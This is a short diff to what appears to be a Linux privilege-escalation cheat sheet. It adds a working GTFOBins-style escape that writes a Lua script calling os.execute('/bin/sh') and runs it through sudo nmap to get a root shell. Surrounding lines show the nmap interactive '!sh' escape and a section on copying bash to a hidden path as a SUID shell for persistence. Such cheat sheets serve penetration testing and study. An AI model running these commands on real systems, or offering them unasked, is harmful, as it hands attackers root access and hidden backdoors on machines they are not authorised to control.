@@ -134,6 +134,12 @@ nmap --interactive
 nmap> !sh
 ~~~
 
+~~~
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+sudo nmap --script=$TF
+~~~
+
 ### Copy existing shells with suid and hide them for persistence 
 
  1. <code>cp /bin/bash /.svc</code>
